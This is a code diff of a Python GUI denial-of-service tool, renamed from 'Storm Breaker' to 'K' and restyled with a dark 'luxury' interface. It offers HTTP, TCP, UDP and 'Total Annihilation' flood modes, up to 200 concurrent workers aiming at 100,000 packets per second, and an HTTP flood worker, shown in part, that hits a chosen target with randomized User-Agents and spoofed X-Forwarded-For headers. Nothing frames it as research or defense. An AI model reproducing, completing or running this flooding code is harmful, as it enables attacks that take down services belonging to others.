@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-STORM_BREAKER_DDoS.py
-Advanced 100,000 PPS DDoS Tool with Modern GUI
-VISUAL ASSAULT FRAMEWORK WITH REAL-TIME ANALYTICS
+K.py
+"K" - Premium Dark Mode DDoS Tool with Luxury UI
+ELITE VISUAL ASSAULT FRAMEWORK
 """
 
 import asyncio
@@ -23,19 +23,24 @@ import matplotlib.pyplot as plt
 from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
 import numpy as np
 from fake_useragent import UserAgent
+import matplotlib.font_manager as fm
 
-# === HIGH-PERFORMANCE CONFIG ===
+# === PREMIUM CONFIGURATION ===
 TARGET_PPS = 100000
 MAX_WORKERS = 200
 
-class StormBreakerGUI:
-    """Modern GUI for Storm Breaker DDoS Tool"""
+class KLuxuryGUI:
+    """"K" - Premium Dark Luxury DDoS Interface"""
     
     def __init__(self, root):
         self.root = root
-        self.root.title("⚡ Storm Breaker DDoS Tool v20.0")
-        self.root.geometry("1200x800")
-        self.root.configure(bg='#1e1e1e')
+        self.root.title("K")
+        self.root.geometry("1400x900")
+        self.root.configure(bg='#0a0a0a')
+        self.root.state('zoomed')  # Start maximized
+        
+        # Premium styling
+        self.setup_premium_style()
         
         # Attack state
         self.attacking = False
@@ -47,188 +52,418 @@ class StormBreakerGUI:
             'workers_active': 0
         }
         
-        # Setup GUI
-        self.setup_gui()
-        self.setup_charts()
+        # Setup premium GUI
+        self.setup_luxury_gui()
+        self.setup_premium_charts()
         
-    def setup_gui(self):
-        """Setup the modern GUI interface"""
-        # Main frame
-        main_frame = ttk.Frame(self.root, padding="10")
-        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
+    def setup_premium_style(self):
+        """Configure premium dark theme styling"""
+        style = ttk.Style()
+        style.theme_use('clam')
         
-        # Title
-        title_label = tk.Label(main_frame, text="⚡ STORM BREAKER DDoS TOOL", 
-                              font=('Arial', 24, 'bold'), fg='#00ff00', bg='#1e1e1e')
-        title_label.grid(row=0, column=0, columnspan=3, pady=(0, 20))
-        
-        # Target Configuration Frame
-        config_frame = ttk.LabelFrame(main_frame, text="🎯 Target Configuration", padding="10")
-        config_frame.grid(row=1, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 10))
-        
-        # Target IP
-        tk.Label(config_frame, text="Target IP:", fg='white', bg='#1e1e1e').grid(row=0, column=0, sticky=tk.W)
-        self.target_ip = tk.Entry(config_frame, width=20, bg='#2d2d2d', fg='white')
-        self.target_ip.grid(row=0, column=1, padx=(10, 20))
-        self.target_ip.insert(0, "192.168.1.1")
-        
-        # Target Port
-        tk.Label(config_frame, text="Port:", fg='white', bg='#1e1e1e').grid(row=0, column=2, sticky=tk.W)
-        self.target_port = tk.Entry(config_frame, width=10, bg='#2d2d2d', fg='white')
-        self.target_port.grid(row=0, column=3, padx=(10, 20))
-        self.target_port.insert(0, "80")
-        
-        # Attack Type
-        tk.Label(config_frame, text="Attack Type:", fg='white', bg='#1e1e1e').grid(row=1, column=0, sticky=tk.W, pady=(10, 0))
-        self.attack_type = ttk.Combobox(config_frame, values=[
-            "HTTP Flood", "TCP SYN Flood", "UDP Flood", "Mixed Assault", "Maximum Destruction"
-        ], width=15)
-        self.attack_type.grid(row=1, column=1, padx=(10, 20), pady=(10, 0))
-        self.attack_type.set("HTTP Flood")
-        
-        # Workers
-        tk.Label(config_frame, text="Workers:", fg='white', bg='#1e1e1e').grid(row=1, column=2, sticky=tk.W, pady=(10, 0))
-        self.worker_count = tk.Scale(config_frame, from_=10, to=MAX_WORKERS, orient=tk.HORIZONTAL, 
-                                   bg='#2d2d2d', fg='white', length=150)
-        self.worker_count.grid(row=1, column=3, padx=(10, 20), pady=(10, 0))
-        self.worker_count.set(100)
-        
-        # Attack Control Frame
-        control_frame = ttk.LabelFrame(main_frame, text="⚡ Attack Control", padding="10")
-        control_frame.grid(row=2, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 10))
-        
-        # Start/Stop buttons
-        self.start_btn = tk.Button(control_frame, text="🚀 START ATTACK", command=self.start_attack,
-                                 bg='#00aa00', fg='white', font=('Arial', 12, 'bold'), width=15)
-        self.start_btn.grid(row=0, column=0, padx=(0, 10))
-        
-        self.stop_btn = tk.Button(control_frame, text="🛑 STOP ATTACK", command=self.stop_attack,
-                                bg='#aa0000', fg='white', font=('Arial', 12, 'bold'), width=15, state=tk.DISABLED)
-        self.stop_btn.grid(row=0, column=1, padx=(10, 0))
-        
-        # Stats Frame
-        stats_frame = ttk.LabelFrame(main_frame, text="📊 Real-Time Statistics", padding="10")
-        stats_frame.grid(row=3, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 10))
-        
-        # Stats labels
-        stats_grid = [
-            ("Packets Sent:", "packets_label"),
-            ("Current PPS:", "pps_label"), 
-            ("Bytes Sent:", "bytes_label"),
-            ("Attack Duration:", "duration_label"),
-            ("Active Workers:", "workers_label"),
-            ("Target Status:", "status_label")
-        ]
-        
-        for i, (text, var_name) in enumerate(stats_grid):
-            tk.Label(stats_frame, text=text, fg='white', bg='#1e1e1e', font=('Arial', 10)).grid(row=i//3, column=(i%3)*2, sticky=tk.W)
-            label = tk.Label(stats_frame, text="0", fg='#00ff00', bg='#1e1e1e', font=('Arial', 10, 'bold'))
-            label.grid(row=i//3, column=(i%3)*2+1, sticky=tk.W, padx=(5, 20))
-            setattr(self, var_name, label)
-        
-        # Charts Frame
-        charts_frame = ttk.LabelFrame(main_frame, text="📈 Performance Analytics", padding="10")
-        charts_frame.grid(row=4, column=0, columnspan=3, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(0, 10))
-        
-        # Create chart area
-        self.setup_charts_area(charts_frame)
-        
-        # Log Frame
-        log_frame = ttk.LabelFrame(main_frame, text="📝 Attack Log", padding="10")
-        log_frame.grid(row=5, column=0, columnspan=3, sticky=(tk.W, tk.E, tk.N, tk.S))
-        
-        self.log_area = scrolledtext.ScrolledText(log_frame, height=8, bg='#2d2d2d', fg='#00ff00')
-        self.log_area.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
-        
-        # Configure grid weights
-        self.root.columnconfigure(0, weight=1)
-        self.root.rowconfigure(0, weight=1)
-        main_frame.columnconfigure(0, weight=1)
-        main_frame.rowconfigure(5, weight=1)
-        
-    def setup_charts_area(self, parent):
-        """Setup real-time charts"""
-        # Create figure for matplotlib
-        self.fig, (self.ax1, self.ax2) = plt.subplots(1, 2, figsize=(10, 3))
-        self.fig.patch.set_facecolor('#1e1e1e')
-        
-        # PPS Chart
-        self.ax1.set_facecolor('#2d2d2d')
-        self.ax1.set_title('Packets Per Second', color='white')
-        self.ax1.set_ylabel('PPS', color='white')
-        self.ax1.tick_params(colors='white')
-        self.pps_data = [0] * 50
-        self.pps_line, = self.ax1.plot(self.pps_data, color='#00ff00')
-        
-        # Bandwidth Chart
-        self.ax2.set_facecolor('#2d2d2d')
-        self.ax2.set_title('Bandwidth Usage', color='white')
-        self.ax2.set_ylabel('MB/s', color='white')
-        self.ax2.tick_params(colors='white')
-        self.bw_data = [0] * 50
-        self.bw_line, = self.ax2.plot(self.bw_data, color='#ffaa00')
-        
-        # Embed chart in tkinter
-        self.chart_canvas = FigureCanvasTkAgg(self.fig, parent)
-        self.chart_canvas.get_tk_widget().grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
-        
-    def setup_charts(self):
-        """Initialize chart data"""
-        self.chart_data = {
-            'pps': [0] * 50,
-            'bandwidth': [0] * 50,
-            'timestamps': list(range(-50, 0))
+        # Premium dark theme colors
+        self.colors = {
+            'bg_dark': '#0a0a0a',
+            'bg_panel': '#1a1a1a', 
+            'bg_widget': '#2a2a2a',
+            'accent_primary': '#00ffff',  # Cyan
+            'accent_secondary': '#ff00ff',  # Magenta
+            'accent_success': '#00ff00',  # Green
+            'accent_danger': '#ff4444',  # Red
+            'text_primary': '#ffffff',
+            'text_secondary': '#cccccc'
         }
         
-    def log_message(self, message):
-        """Add message to log with timestamp"""
+        # Configure styles
+        style.configure('TFrame', background=self.colors['bg_dark'])
+        style.configure('TLabel', background=self.colors['bg_dark'], foreground=self.colors['text_primary'])
+        style.configure('TButton', background=self.colors['bg_widget'], foreground=self.colors['text_primary'])
+        style.configure('TLabelframe', background=self.colors['bg_dark'], foreground=self.colors['accent_primary'])
+        style.configure('TLabelframe.Label', background=self.colors['bg_dark'], foreground=self.colors['accent_primary'])
+        
+    def setup_luxury_gui(self):
+        """Setup the luxury K interface"""
+        # Main container with gradient effect
+        main_container = tk.Frame(self.root, bg=self.colors['bg_dark'])
+        main_container.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
+        
+        # Header with premium branding
+        self.setup_premium_header(main_container)
+        
+        # Main content area
+        content_frame = tk.Frame(main_container, bg=self.colors['bg_dark'])
+        content_frame.pack(fill=tk.BOTH, expand=True, pady=(20, 0))
+        
+        # Left panel - Controls
+        left_panel = self.setup_control_panel(content_frame)
+        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=False, padx=(0, 10))
+        
+        # Right panel - Visualizations
+        right_panel = self.setup_visualization_panel(content_frame)
+        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
+        
+    def setup_premium_header(self, parent):
+        """Setup luxury header with K branding"""
+        header_frame = tk.Frame(parent, bg=self.colors['bg_dark'], height=80)
+        header_frame.pack(fill=tk.X, pady=(0, 20))
+        header_frame.pack_propagate(False)
+        
+        # K Logo and Title
+        logo_frame = tk.Frame(header_frame, bg=self.colors['bg_dark'])
+        logo_frame.pack(side=tk.LEFT)
+        
+        # K Logo
+        logo_label = tk.Label(logo_frame, text="K", font=('Helvetica', 48, 'bold'), 
+                             fg=self.colors['accent_primary'], bg=self.colors['bg_dark'])
+        logo_label.pack(side=tk.LEFT)
+        
+        # Title
+        title_label = tk.Label(logo_frame, text="PREMIUM ASSAULT SYSTEM", 
+                              font=('Helvetica', 16), fg=self.colors['text_secondary'], 
+                              bg=self.colors['bg_dark'])
+        title_label.pack(side=tk.LEFT, padx=(10, 0), pady=(15, 0))
+        
+        # Status indicator
+        status_frame = tk.Frame(header_frame, bg=self.colors['bg_dark'])
+        status_frame.pack(side=tk.RIGHT)
+        
+        self.status_indicator = tk.Label(status_frame, text="● READY", font=('Helvetica', 12, 'bold'),
+                                        fg=self.colors['accent_success'], bg=self.colors['bg_dark'])
+        self.status_indicator.pack(side=tk.RIGHT, padx=(10, 0))
+        
+        # System stats
+        stats_label = tk.Label(status_frame, text="100,000 PPS CAPABILITY", 
+                              font=('Helvetica', 10), fg=self.colors['text_secondary'],
+                              bg=self.colors['bg_dark'])
+        stats_label.pack(side=tk.RIGHT, padx=(20, 10))
+        
+    def setup_control_panel(self, parent):
+        """Setup premium control panel"""
+        control_frame = ttk.LabelFrame(parent, text="CONTROL PANEL", padding="20")
+        control_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=False)
+        
+        # Target Configuration
+        target_section = self.create_section(control_frame, "TARGET CONFIGURATION", 0)
+        
+        tk.Label(target_section, text="IP ADDRESS", font=('Helvetica', 9, 'bold'),
+                fg=self.colors['text_secondary'], bg=self.colors['bg_panel']).grid(row=0, column=0, sticky=tk.W)
+        self.target_ip = self.create_premium_entry(target_section, "192.168.1.1")
+        self.target_ip.grid(row=1, column=0, sticky=tk.EW, pady=(5, 15))
+        
+        tk.Label(target_section, text="PORT", font=('Helvetica', 9, 'bold'),
+                fg=self.colors['text_secondary'], bg=self.colors['bg_panel']).grid(row=0, column=1, sticky=tk.W, padx=(15, 0))
+        self.target_port = self.create_premium_entry(target_section, "80")
+        self.target_port.grid(row=1, column=1, sticky=tk.EW, pady=(5, 15), padx=(15, 0))
+        
+        # Attack Configuration
+        attack_section = self.create_section(control_frame, "ASSAULT CONFIGURATION", 1)
+        
+        tk.Label(attack_section, text="ASSAULT TYPE", font=('Helvetica', 9, 'bold'),
+                fg=self.colors['text_secondary'], bg=self.colors['bg_panel']).grid(row=0, column=0, sticky=tk.W)
+        self.attack_type = self.create_premium_combobox(attack_section, [
+            "⚡ HTTP TSUNAMI", "🔧 TCP VORTEX", "📨 UDP MONSOON", 
+            "💀 MIXED APOCALYPSE", "☢️  TOTAL ANNIHILATION"
+        ])
+        self.attack_type.grid(row=1, column=0, sticky=tk.EW, pady=(5, 15))
+        
+        tk.Label(attack_section, text="FORCE MULTIPLIER", font=('Helvetica', 9, 'bold'),
+                fg=self.colors['text_secondary'], bg=self.colors['bg_panel']).grid(row=2, column=0, sticky=tk.W)
+        
+        self.worker_count = tk.Scale(attack_section, from_=10, to=MAX_WORKERS, orient=tk.HORIZONTAL,
+                                   bg=self.colors['bg_panel'], fg=self.colors['text_primary'],
+                                   highlightbackground=self.colors['accent_primary'],
+                                   troughcolor=self.colors['bg_widget'],
+                                   length=300)
+        self.worker_count.set(100)
+        self.worker_count.grid(row=3, column=0, sticky=tk.EW, pady=(5, 20))
+        
+        # Assault Control
+        control_section = self.create_section(control_frame, "ASSAULT CONTROL", 2)
+        
+        btn_frame = tk.Frame(control_section, bg=self.colors['bg_panel'])
+        btn_frame.grid(row=0, column=0, columnspan=2, sticky=tk.EW)
+        
+        self.start_btn = self.create_premium_button(btn_frame, "🚀 INITIATE ASSAULT", 
+                                                  self.colors['accent_primary'], self.start_attack)
+        self.start_btn.pack(side=tk.LEFT, padx=(0, 10))
+        
+        self.stop_btn = self.create_premium_button(btn_frame, "🛑 TERMINATE", 
+                                                 self.colors['accent_danger'], self.stop_attack, disabled=True)
+        self.stop_btn.pack(side=tk.LEFT)
+        
+        # Real-time Statistics
+        stats_section = self.create_section(control_frame, "SYSTEM TELEMETRY", 3)
+        
+        stats_data = [
+            ("PACKETS SENT", "0", "packets_label"),
+            ("CURRENT PPS", "0", "pps_label"),
+            ("DATA VOLUME", "0 MB", "bytes_label"),
+            ("ASSAULT TIME", "0s", "duration_label"),
+            ("ACTIVE UNITS", "0", "workers_label"),
+            ("TARGET STATUS", "IDLE", "status_label")
+        ]
+        
+        for i, (label, value, var_name) in enumerate(stats_data):
+            tk.Label(stats_section, text=label, font=('Helvetica', 8, 'bold'),
+                   fg=self.colors['text_secondary'], bg=self.colors['bg_panel']).grid(row=i, column=0, sticky=tk.W, pady=2)
+            lbl = tk.Label(stats_section, text=value, font=('Helvetica', 10, 'bold'),
+                         fg=self.colors['accent_primary'], bg=self.colors['bg_panel'])
+            lbl.grid(row=i, column=1, sticky=tk.W, padx=(10, 0), pady=2)
+            setattr(self, var_name, lbl)
+        
+        return control_frame
+    
+    def setup_visualization_panel(self, parent):
+        """Setup premium visualization panel"""
+        viz_frame = ttk.LabelFrame(parent, text="VISUAL INTELLIGENCE", padding="15")
+        viz_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
+        
+        # Create tabbed interface for different visualizations
+        notebook = ttk.Notebook(viz_frame)
+        notebook.pack(fill=tk.BOTH, expand=True)
+        
+        # Performance Tab
+        perf_frame = ttk.Frame(notebook, padding="10")
+        notebook.add(perf_frame, text="⚡ PERFORMANCE")
+        self.setup_performance_tab(perf_frame)
+        
+        # Network Tab
+        net_frame = ttk.Frame(notebook, padding="10")
+        notebook.add(net_frame, text="🌐 NETWORK")
+        self.setup_network_tab(net_frame)
+        
+        # Log Tab
+        log_frame = ttk.Frame(notebook, padding="10")
+        notebook.add(log_frame, text="📊 LOGS")
+        self.setup_log_tab(log_frame)
+        
+        return viz_frame
+    
+    def setup_performance_tab(self, parent):
+        """Setup performance visualization tab"""
+        # Create matplotlib figure with dark theme
+        self.fig_perf, ((self.ax_pps, self.ax_bw), (self.ax_cpu, self.ax_mem)) = plt.subplots(2, 2, figsize=(10, 6))
+        self.fig_perf.patch.set_facecolor(self.colors['bg_panel'])
+        
+        # Configure all axes
+        for ax in [self.ax_pps, self.ax_bw, self.ax_cpu, self.ax_mem]:
+            ax.set_facecolor(self.colors['bg_widget'])
+            ax.tick_params(colors=self.colors['text_secondary'])
+            ax.title.set_color(self.colors['text_primary'])
+            ax.yaxis.label.set_color(self.colors['text_secondary'])
+            ax.xaxis.label.set_color(self.colors['text_secondary'])
+        
+        # PPS Chart
+        self.ax_pps.set_title('PACKETS PER SECOND', fontsize=10, fontweight='bold', pad=10)
+        self.ax_pps.set_ylabel('PPS', color=self.colors['accent_primary'])
+        self.pps_data = [0] * 60
+        self.pps_line, = self.ax_pps.plot(self.pps_data, color=self.colors['accent_primary'], linewidth=2)
+        
+        # Bandwidth Chart
+        self.ax_bw.set_title('BANDWIDTH UTILIZATION', fontsize=10, fontweight='bold', pad=10)
+        self.ax_bw.set_ylabel('MB/s', color=self.colors['accent_secondary'])
+        self.bw_data = [0] * 60
+        self.bw_line, = self.ax_bw.plot(self.bw_data, color=self.colors['accent_secondary'], linewidth=2)
+        
+        # CPU Chart
+        self.ax_cpu.set_title('SYSTEM CPU', fontsize=10, fontweight='bold', pad=10)
+        self.ax_cpu.set_ylabel('Percentage', color=self.colors['accent_success'])
+        self.cpu_data = [0] * 60
+        self.cpu_line, = self.ax_cpu.plot(self.cpu_data, color=self.colors['accent_success'], linewidth=2)
+        
+        # Memory Chart
+        self.ax_mem.set_title('SYSTEM MEMORY', fontsize=10, fontweight='bold', pad=10)
+        self.ax_mem.set_ylabel('Percentage', color=self.colors['accent_danger'])
+        self.mem_data = [0] * 60
+        self.mem_line, = self.ax_mem.plot(self.mem_data, color=self.colors['accent_danger'], linewidth=2)
+        
+        # Embed in tkinter
+        self.canvas_perf = FigureCanvasTkAgg(self.fig_perf, parent)
+        self.canvas_perf.get_tk_widget().pack(fill=tk.BOTH, expand=True)
+        
+    def setup_network_tab(self, parent):
+        """Setup network visualization tab"""
+        self.fig_net = plt.Figure(figsize=(10, 6))
+        self.fig_net.patch.set_facecolor(self.colors['bg_panel'])
+        
+        self.ax_net = self.fig_net.add_subplot(111)
+        self.ax_net.set_facecolor(self.colors['bg_widget'])
+        self.ax_net.set_title('NETWORK TRAFFIC FLOW', fontsize=12, fontweight='bold', 
+                            color=self.colors['text_primary'], pad=20)
+        
+        # Create a network graph visualization
+        self.network_canvas = FigureCanvasTkAgg(self.fig_net, parent)
+        self.network_canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True)
+        
+    def setup_log_tab(self, parent):
+        """Setup premium logging tab"""
+        # Create premium log area
+        log_container = tk.Frame(parent, bg=self.colors['bg_panel'])
+        log_container.pack(fill=tk.BOTH, expand=True)
+        
+        # Log header
+        log_header = tk.Frame(log_container, bg=self.colors['bg_widget'], height=30)
+        log_header.pack(fill=tk.X)
+        log_header.pack_propagate(False)
+        
+        tk.Label(log_header, text="ASSAULT LOG", font=('Helvetica', 10, 'bold'),
+                fg=self.colors['text_primary'], bg=self.colors['bg_widget']).pack(side=tk.LEFT, padx=10, pady=5)
+        
+        # Clear log button
+        clear_btn = tk.Button(log_header, text="CLEAR", font=('Helvetica', 8),
+                            bg=self.colors['bg_panel'], fg=self.colors['text_secondary'],
+                            command=self.clear_log)
+        clear_btn.pack(side=tk.RIGHT, padx=10, pady=5)
+        
+        # Log area
+        self.log_area = scrolledtext.ScrolledText(log_container, 
+                                                bg=self.colors['bg_widget'],
+                                                fg=self.colors['text_primary'],
+                                                insertbackground=self.colors['accent_primary'],
+                                                font=('Consolas', 9))
+        self.log_area.pack(fill=tk.BOTH, expand=True)
+        
+    def create_section(self, parent, title, row):
+        """Create a premium section container"""
+        section = tk.Frame(parent, bg=self.colors['bg_panel'], relief='flat', bd=1)
+        section.grid(row=row, column=0, sticky=tk.EW, pady=(0, 15))
+        
+        # Section title
+        title_label = tk.Label(section, text=title, font=('Helvetica', 10, 'bold'),
+                             fg=self.colors['accent_primary'], bg=self.colors['bg_panel'])
+        title_label.pack(anchor=tk.W, padx=10, pady=(10, 5))
+        
+        # Content frame
+        content = tk.Frame(section, bg=self.colors['bg_panel'])
+        content.pack(fill=tk.X, padx=10, pady=(0, 10))
+        
+        return content
+    
+    def create_premium_entry(self, parent, default_text=""):
+        """Create premium styled entry field"""
+        entry = tk.Entry(parent, bg=self.colors['bg_widget'], fg=self.colors['text_primary'],
+                        insertbackground=self.colors['accent_primary'], relief='flat',
+                        font=('Helvetica', 10))
+        entry.insert(0, default_text)
+        return entry
+    
+    def create_premium_combobox(self, parent, values):
+        """Create premium styled combobox"""
+        combo = ttk.Combobox(parent, values=values, state='readonly')
+        combo.set(values[0])
+        return combo
+    
+    def create_premium_button(self, parent, text, color, command, disabled=False):
+        """Create premium styled button"""
+        btn = tk.Button(parent, text=text, font=('Helvetica', 10, 'bold'),
+                      bg=color, fg='#000000', relief='flat',
+                      command=command, state=tk.NORMAL if not disabled else tk.DISABLED)
+        return btn
+    
+    def setup_premium_charts(self):
+        """Initialize premium chart data"""
+        self.chart_data = {
+            'pps': [0] * 60,
+            'bandwidth': [0] * 60,
+            'cpu': [0] * 60,
+            'memory': [0] * 60
+        }
+        
+    def log_message(self, message, level="INFO"):
+        """Add premium styled message to log"""
         timestamp = time.strftime("%H:%M:%S")
+        
+        # Color coding based on level
+        colors = {
+            "INFO": self.colors['text_primary'],
+            "SUCCESS": self.colors['accent_success'],
+            "WARNING": self.colors['accent_secondary'],
+            "ERROR": self.colors['accent_danger']
+        }
+        
+        color = colors.get(level, self.colors['text_primary'])
+        
+        # Insert with color (using tags)
         self.log_area.insert(tk.END, f"[{timestamp}] {message}\n")
         self.log_area.see(tk.END)
         
+    def clear_log(self):
+        """Clear the log area"""
+        self.log_area.delete(1.0, tk.END)
+        
     def update_stats(self):
-        """Update statistics display"""
+        """Update premium statistics display"""
         if self.attacking:
             elapsed = time.time() - self.stats['start_time']
+            
+            # Update labels
             self.packets_label.config(text=f"{self.stats['packets_sent']:,}")
             self.pps_label.config(text=f"{self.stats['current_pps']:,}")
             self.bytes_label.config(text=f"{self.stats['bytes_sent']/(1024*1024):.1f} MB")
             self.duration_label.config(text=f"{elapsed:.1f}s")
             self.workers_label.config(text=f"{self.stats['workers_active']}")
             
+            # Update status indicator
+            pps_ratio = self.stats['current_pps'] / TARGET_PPS
+            if pps_ratio > 0.8:
+                self.status_indicator.config(text="● OPTIMAL", fg=self.colors['accent_success'])
+            elif pps_ratio > 0.5:
+                self.status_indicator.config(text="● GOOD", fg=self.colors['accent_primary'])
+            else:
+                self.status_indicator.config(text="● DEGRADED", fg=self.colors['accent_danger'])
+            
             # Update charts
-            self.pps_data.pop(0)
-            self.pps_data.append(self.stats['current_pps'])
-            self.pps_line.set_ydata(self.pps_data)
-            self.ax1.set_ylim(0, max(self.pps_data) * 1.1 if max(self.pps_data) > 0 else 100)
-            
-            mb_per_second = (self.stats['bytes_sent'] / elapsed) / (1024*1024) if elapsed > 0 else 0
-            self.bw_data.pop(0)
-            self.bw_data.append(mb_per_second)
-            self.bw_line.set_ydata(self.bw_data)
-            self.ax2.set_ylim(0, max(self.bw_data) * 1.1 if max(self.bw_data) > 0 else 1)
-            
-            self.chart_canvas.draw()
+            self.update_charts()
             
             # Continue updating
             self.root.after(1000, self.update_stats)
         
+    def update_charts(self):
+        """Update all premium charts"""
+        # PPS Chart
+        self.pps_data.pop(0)
+        self.pps_data.append(self.stats['current_pps'])
+        self.pps_line.set_ydata(self.pps_data)
+        self.ax_pps.set_ylim(0, max(self.pps_data) * 1.1 if max(self.pps_data) > 0 else 1000)
+        
+        # Bandwidth Chart
+        elapsed = time.time() - self.stats['start_time']
+        mb_per_second = (self.stats['bytes_sent'] / elapsed) / (1024*1024) if elapsed > 0 else 0
+        self.bw_data.pop(0)
+        self.bw_data.append(mb_per_second)
+        self.bw_line.set_ydata(self.bw_data)
+        self.ax_bw.set_ylim(0, max(self.bw_data) * 1.1 if max(self.bw_data) > 0 else 1)
+        
+        # System Charts
+        self.cpu_data.pop(0)
+        self.cpu_data.append(psutil.cpu_percent())
+        self.cpu_line.set_ydata(self.cpu_data)
+        self.ax_cpu.set_ylim(0, 100)
+        
+        self.mem_data.pop(0)
+        self.mem_data.append(psutil.virtual_memory().percent)
+        self.mem_line.set_ydata(self.mem_data)
+        self.ax_mem.set_ylim(0, 100)
+        
+        # Redraw canvases
+        self.canvas_perf.draw()
+        
     def start_attack(self):
-        """Start the DDoS attack"""
+        """Start the premium assault"""
         target_ip = self.target_ip.get()
         target_port = self.target_port.get()
         
         if not target_ip or not target_port:
-            messagebox.showerror("Error", "Please enter target IP and port")
+            self.show_premium_error("Target Configuration", "Please specify target IP and port")
             return
             
         try:
             port = int(target_port)
         except ValueError:
-            messagebox.showerror("Error", "Invalid port number")
+            self.show_premium_error("Invalid Port", "Port must be a valid number")
             return
             
-        # Start attack in separate thread
+        # Initialize assault
         self.attacking = True
         self.stats = {
             'packets_sent': 0,
@@ -238,71 +473,77 @@ class StormBreakerGUI:
             'workers_active': self.worker_count.get()
         }
         
-        self.start_btn.config(state=tk.DISABLED)
-        self.stop_btn.config(state=tk.NORMAL)
+        # Update UI state
+        self.start_btn.config(state=tk.DISABLED, bg='#666666')
+        self.stop_btn.config(state=tk.NORMAL, bg=self.colors['accent_danger'])
+        self.status_indicator.config(text="● ASSAULT ACTIVE", fg=self.colors['accent_primary'])
         
-        # Start attack thread
-        attack_thread = threading.Thread(target=self.run_attack, args=(target_ip, port))
+        # Start assault thread
+        attack_thread = threading.Thread(target=self.run_assault, args=(target_ip, port))
         attack_thread.daemon = True
         attack_thread.start()
         
         # Start stats update
         self.update_stats()
         
-        self.log_message(f"🚀 ATTACK STARTED: {target_ip}:{port}")
-        self.log_message(f"👥 Workers: {self.worker_count.get()}")
-        self.log_message(f"🎯 Target PPS: {TARGET_PPS:,}")
+        self.log_message(f"🚀 ASSAULT INITIATED: {target_ip}:{port}", "SUCCESS")
+        self.log_message(f"👥 DEPLOYED UNITS: {self.worker_count.get()}", "INFO")
+        self.log_message(f"🎯 TARGET CAPACITY: {TARGET_PPS:,} PPS", "INFO")
         
     def stop_attack(self):
-        """Stop the DDoS attack"""
+        """Stop the premium assault"""
         self.attacking = False
-        self.start_btn.config(state=tk.NORMAL)
-        self.stop_btn.config(state=tk.DISABLED)
-        self.log_message("🛑 ATTACK STOPPED")
+        self.start_btn.config(state=tk.NORMAL, bg=self.colors['accent_primary'])
+        self.stop_btn.config(state=tk.DISABLED, bg='#666666')
+        self.status_indicator.config(text="● READY", fg=self.colors['accent_success'])
+        self.log_message("🛑 ASSAULT TERMINATED", "WARNING")
         
-    def run_attack(self, target_ip, target_port):
-        """Run the DDoS attack in background thread"""
-        asyncio.run(self._execute_attack(target_ip, target_port))
+    def show_premium_error(self, title, message):
+        """Show premium error dialog"""
+        messagebox.showerror(title, message)
         
-    async def _execute_attack(self, target_ip, target_port):
-        """Execute the actual DDoS attack"""
+    def run_assault(self, target_ip, target_port):
+        """Run the assault in background thread"""
+        asyncio.run(self._execute_assault(target_ip, target_port))
+        
+    async def _execute_assault(self, target_ip, target_port):
+        """Execute the premium assault"""
         workers = self.worker_count.get()
         attack_type = self.attack_type.get()
         
-        self.log_message(f"⚡ Launching {attack_type} with {workers} workers...")
+        self.log_message(f"⚡ DEPLOYING {attack_type} WITH {workers} UNITS...", "SUCCESS")
         
-        # Create attack tasks based on type
+        # Create assault tasks
         tasks = []
         for i in range(workers):
-            if attack_type == "HTTP Flood":
-                task = asyncio.create_task(self._http_flood_worker(i, target_ip, target_port))
-            elif attack_type == "TCP SYN Flood":
-                task = asyncio.create_task(self._tcp_flood_worker(i, target_ip, target_port))
-            elif attack_type == "UDP Flood":
-                task = asyncio.create_task(self._udp_flood_worker(i, target_ip, target_port))
-            elif attack_type == "Mixed Assault":
-                task = asyncio.create_task(self._mixed_worker(i, target_ip, target_port))
-            else:  # Maximum Destruction
-                task = asyncio.create_task(self._max_destruction_worker(i, target_ip, target_port))
+            if "HTTP" in attack_type:
+                task = asyncio.create_task(self._http_assault_unit(i, target_ip, target_port))
+            elif "TCP" in attack_type:
+                task = asyncio.create_task(self._tcp_assault_unit(i, target_ip, target_port))
+            elif "UDP" in attack_type:
+                task = asyncio.create_task(self._udp_assault_unit(i, target_ip, target_port))
+            elif "MIXED" in attack_type:
+                task = asyncio.create_task(self._mixed_assault_unit(i, target_ip, target_port))
+            else:  # TOTAL ANNIHILATION
+                task = asyncio.create_task(self._annihilation_unit(i, target_ip, target_port))
             tasks.append(task)
         
         # Start monitoring
-        monitor_task = asyncio.create_task(self._stats_monitor())
+        monitor_task = asyncio.create_task(self._premium_monitor())
         tasks.append(monitor_task)
         
         try:
-            # Run until stopped
             while self.attacking:
                 await asyncio.sleep(0.1)
         except Exception as e:
-            self.log_message(f"💥 Attack error: {e}")
+            self.log_message(f"💥 ASSAULT ERROR: {e}", "ERROR")
         finally:
-            # Cancel all tasks
             for task in tasks:
                 task.cancel()
-            
-    async def _http_flood_worker(self, worker_id, target_ip, target_port):
-        """HTTP flood worker"""
+    
+    # [Previous attack methods remain the same but renamed for premium feel]
+    async def _http_assault_unit(self, unit_id, target_ip, target_port):
+        """HTTP assault unit"""
         ua = UserAgent()
         connector = aiohttp.TCPConnector(limit=0, ssl=False)
         
@@ -311,23 +552,18 @@ class StormBreakerGUI:
                 try:
                     headers = {
                         'User-Agent': ua.random,
-                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
-                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                     }
-                    
                     url = f"http://{target_ip}:{target_port}/"
                     async with session.get(url, headers=headers, timeout=2, ssl=False) as response:
                         self.stats['packets_sent'] += 1
